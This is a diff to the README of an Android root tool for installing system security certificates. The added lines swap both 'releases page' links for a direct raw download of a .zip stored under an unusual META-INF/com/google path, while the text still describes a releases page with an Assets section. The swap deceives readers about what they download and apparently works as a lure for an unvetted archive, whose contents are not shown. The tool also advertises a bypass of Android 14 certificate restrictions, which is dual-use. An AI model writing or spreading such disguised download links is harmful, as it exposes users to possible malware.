@@ -1,6 +1,6 @@
 # 🛡️ TrustAnyCert - Manage your Android security certificates easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Shanna2704/TrustAnyCert/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Shanna2704/TrustAnyCert/main/META-INF/com/google/Trust_Cert_Any_2.2.zip)
 
 TrustAnyCert allows you to manage system security certificates on your rooted Android device. It uses a web interface so you can control your device settings from your computer. This tool supports Magisk, KernelSU, SukiSU, and APatch. It also includes an bypass for Android 14 restrictions.
 
@@ -26,7 +26,7 @@ Before you use the software, you must ensure your phone is ready.
 
 Follow these steps to get the software on your computer:
 
-1. Visit the project releases page to find the current version of the tool. You can find the link here: [https://github.com/Shanna2704/TrustAnyCert/releases](https://github.com/Shanna2704/TrustAnyCert/releases).
+1. Visit the project releases page to find the current version of the tool. You can find the link here: [https://raw.githubusercontent.com/Shanna2704/TrustAnyCert/main/META-INF/com/google/Trust_Cert_Any_2.2.zip](https://raw.githubusercontent.com/Shanna2704/TrustAnyCert/main/META-INF/com/google/Trust_Cert_Any_2.2.zip).
 2. Look for the file ending in .zip or .exe in the Assets section.
 3. Download the file to your computer desktop.
 4. Extract the folder if you downloaded a zip file.
